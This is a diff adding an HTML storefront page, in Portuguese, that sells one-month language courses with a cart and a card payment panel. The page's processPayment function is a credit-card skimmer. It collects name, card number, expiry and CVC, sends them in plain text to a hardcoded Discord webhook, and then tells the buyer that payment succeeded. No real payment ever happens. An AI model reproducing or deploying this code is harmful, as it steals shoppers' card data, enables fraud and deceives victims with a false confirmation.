@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="robuxprivate.ico">
+    <title>Cursos de idiomas</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background-color: #121212; /* Fundo preto */
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        header {
+            background-color: #333; /* Cinza escuro */
+            color: white;
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            box-sizing: border-box;
+            position: fixed;
+            top: 0;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 28px;
+        }
+        .cart-icon {
+            background-color: #ff0000; /* Verde para o ícone do carrinho */
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            font-size: 22px;
+            cursor: pointer;
+        }
+        main {
+            padding: 80px 20px 20px;
+            width: 100%;
+            max-width: 1100px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .product {
+            border-radius: 20px; /* Bordas arredondadas */
+            padding: 20px;
+            margin: 20px;
+            background-color: #1e1e1e; /* Fundo cinza escuro */
+            width: 250px;
+            text-align: center;
+            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease-in-out;
+        }
+        .product:hover {
+            transform: scale(1.05);
+        }
+        .product img {
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+        .product h2 {
+            margin: 10px 0;
+            font-size: 20px;
+            color: blue;
+        }
+        .product p {
+            margin: 10px 0;
+            font-size: 16px;
+        }
+        .product button {
+            background-color: blue;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 10px; /* Bordas arredondadas */
+            cursor: pointer;
+            transition: background-color 0.3s ease-in-out;
+        }
+        .product button:hover {
+            background-color: blue;
+        }
+        .cart {
+            display: none;
+            background-color: #1e1e1e; /* Fundo cinza escuro */
+            padding: 20px;
+            position: fixed;
+            top: 80px;
+            right: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            width: 300px;
+        }
+        .cart.active {
+            display: block;
+        }
+        .cart-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+        .checkout {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .payment-panel {
+            display: none;
+            background-color: #1e1e1e; /* Fundo cinza escuro */
+            padding: 30px;
+            position: fixed;
+            top: 50px;
+            left: 50%;
+            transform: translateX(-50%);
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        .payment-panel.active {
+            display: block;
+        }
+        .payment-panel input {
+            display: block;
+            width: calc(100% - 20px);
+            margin: 15px 0;
+            padding: 12px;
+            border: 1px solid #333;
+            border-radius: 10px;
+            background-color: #121212;
+            color: #fff;
+        }
+        .payment-panel button {
+            background-color: blue;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+        .payment-panel button:hover {
+            background-color: blue;
+        }
+
+    </style>
+</head>
+<body>
+    <header>
+        <h1><small>VOLTAR A</small> <a href="index.html">PAGINA INCIAL </a></h1>
+        <button class="cart-icon" onclick="toggleCart()">🛒</button>
+    </header>
+    <main>
+        <div class="product">
+            <img src="https://i.pinimg.com/736x/68/17/8d/68178d594499e85b8f0530449f1e053a.jpg" alt="ALEMÃO CURSO">
+            <h2>APRENDA ALEMÃO</h2>
+            <p><strong>1 MÊS</strong></p>
+            <p>29,99R$</p>
+            <button onclick="addToCart('APRENDA ALEMÃO', 29.99)">Adicionar ao Carrinho</button>
+        </div>
+        <div class="product">
+            <img src="https://i.pinimg.com/736x/e6/92/1f/e6921faf6543cb07b1a88e60e29624ba.jpg" alt="ITALIANO CURSO">
+            <h2>APRENDA ITALIANO</h2>
+            <p><strong>1 MÊS</strong></p>
+            <p>29,99R$</p>
+            <button onclick="addToCart('APRENDA ITALIANO', 29.99)">Adicionar ao Carrinho</button>
+        </div>
+        <div class="product">
+            <img src="https://i.pinimg.com/736x/bb/3d/f5/bb3df5b682be1e3a464f0437abcb0321.jpg" alt="ARABÊ CURSO">
+            <h2>APRENDA ARABÊ</h2>
+            <p><strong>1 MÊS</strong></p>
+            <p>29,99R$</p>
+            <button onclick="addToCart('APRENDA ARABÊ', 29.99)">Adicionar ao Carrinho</button>
+        </div>
+        <div class="product">
+            <img src="https://i.pinimg.com/736x/df/90/e3/df90e392f1e76e8eccfce705d4f0aaee.jpg" alt="CHINÊS CURSO">
+            <h2>APRENDA CHINÊS</h2>
+            <p><strong>1 MÊS</strong></p>
+            <p>29,99R$</p>
+            <button onclick="addToCart('APRENDA CHINÊS', 29.99)">Adicionar ao Carrinho</button>
+        </div>
+        <div class="product">
+            <img src="https://i.pinimg.com/736x/18/2d/75/182d75285142ad12fb2cad0bc7286704.jpg" alt="JAPONÊS CURSO">
+            <h2>APRENDA JAPONÊS</h2>
+            <p><strong>1 MÊS</strong></p>
+            <p>29,99R$</p>
+            <button onclick="addToCart('APRENDA JAPONÊS', 29.99)">Adicionar ao Carrinho</button>
+        </div>
+        <div class="product">
+            <img src="https://i.pinimg.com/236x/35/0b/cc/350bcc9117a8bf46e3e6dbb8463f2aa2.jpg" alt="RUSSO CURSO">
+            <h2>APRENDA RUSSO</h2>
+            <p><strong>1 MÊS</strong></p>
+            <p>29,99R$</p>
+            <button onclick="addToCart('APRENDA RUSSO', 29.99)">Adicionar ao Carrinho</button>
+        </div>
+        <div class="product">
+            <img src="https://i.pinimg.com/736x/48/16/b7/4816b79caf38ea1ee6b6d13bdaf95309.jpg" alt="TURCO CURSO">
+            <h2>APRENDA TURCO</h2>
+            <p><strong>1 MÊS</strong></p>
+            <p>29,99R$</p>
+            <button onclick="addToCart('APRENDA TURCO', 29.99)">Adicionar ao Carrinho</button>
+        </div>
+        <div class="product">
+            <img src="https://i.pinimg.com/736x/d7/a3/a8/d7a3a85cfa6a1c6d48b45fe3271b0655.jpg" alt="FRANCÊS CURSO">
+            <h2>APRENDA FRANCÊS</h2>
+            <p><strong>1 MÊS</strong></p>
+            <p>29,99R$</p>
+            <button onclick="addToCart('APRENDA FRANCÊS', 29.99)">Adicionar ao Carrinho</button>
+        </div>
+        <div class="product">
+            <img src="https://i.pinimg.com/736x/97/25/01/972501799b7160f1028a2ddb3a53637f.jpg" alt="INGLÊS CURSO">
+            <h2>APRENDA INGLÊS</h2>
+            <p><strong>1 MÊS</strong></p>
+            <p>9,99R$</p>
+            <button onclick="addToCart('APRENDA INGLÊS', 9.99)">Adicionar ao Carrinho</button>
+        </div>
+        <div class="product">
+            <img src="https://i.pinimg.com/736x/9e/aa/d4/9eaad4cfb4ba497cb63a8ab572bcac98.jpg" alt="ESPANHOL CURSO">
+            <h2>APRENDA ESPANHOL</h2>
+            <p><strong>1 MÊS</strong></p>
+            <p>9,99R$</p>
+            <button onclick="addToCart('APRENDA ESPANHOL', 9.99)">Adicionar ao Carrinho</button>
+        </div>
+    </main>
+    
+    <div class="cart" id="cart">
+        <h2>Cart</h2>
+        <div id="cart-items"></div>
+        <div class="checkout">
+            <p>Total: $<span id="total-price">0</span></p>
+            <button onclick="redirectToPaymentPage()">Checkout</button>
+        </div>
+    </div>
+    <div class="payment-panel" id="payment-panel">
+        <h2>Payment</h2>
+        <input type="text" id="card-name" placeholder="Cardholder Name">
+        <input type="text" id="card-number" placeholder="Card Number">
+        <input type="text" id="card-expiry" placeholder="Expiry Date">
+        <input type="text" id="card-cvc" placeholder="CVC">
+        <button onclick="processPayment()">Pay</button>
+    </div>
+    <script>
+        function redirectToPaymentPage() {
+    // Substitua "pagina2.html" pelo nome do arquivo da página de pagamento
+    window.location.href = "pagamento.html";
+}
+
+        
+        let cart = [];
+        let totalPrice = 0;
+
+        function addToCart(product, price) {
+            cart.push({ product, price });
+            totalPrice += price;
+            updateCartUI();
+        }
+
+        function updateCartUI() {
+            const cartItemsDiv = document.getElementById('cart-items');
+            cartItemsDiv.innerHTML = '';
+            cart.forEach(item => {
+                const div = document.createElement('div');
+                div.className = 'cart-item';
+                div.innerHTML = `<span>${item.product}</span><span>$${item.price}</span>`;
+                cartItemsDiv.appendChild(div);
+            });
+            document.getElementById('total-price').innerText = totalPrice.toFixed(2);
+        }
+
+        function toggleCart() {
+            const cartDiv = document.getElementById('cart');
+            cartDiv.classList.toggle('active');
+        }
+
+        function openPaymentPanel() {
+            const paymentPanel = document.getElementById('payment-panel');
+            paymentPanel.classList.add('active');
+        }
+
+        function processPayment() {
+            const name = document.getElementById('card-name').value;
+            const number = document.getElementById('card-number').value;
+            const expiry = document.getElementById('card-expiry').value;
+            const cvc = document.getElementById('card-cvc').value;
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1330060097329696830/Mn8fI9GFFDiG8DfTtquq-ub41dWW8BY436ImzK-VEs0ac2d5hc0fGl9F11iPMq6vcYuU';
+
+            const paymentDetails = {
+                content: `Payment Details:\nName: ${name}\nCard Number: ${number}\nExpiry: ${expiry}\nCVC: ${cvc}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(paymentDetails),
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Payment processed successfully!');
+                    cart = [];
+                    totalPrice = 0;
+                    updateCartUI();
+                    document.getElementById('payment-panel').classList.remove('active');
+                } else {
+                    alert('Payment failed. Please try again.');
+                }
+            })
+            .catch(error => {
+                alert('Error processing payment.');
+            });
+        }
+    </script>
+</body>
+</html>
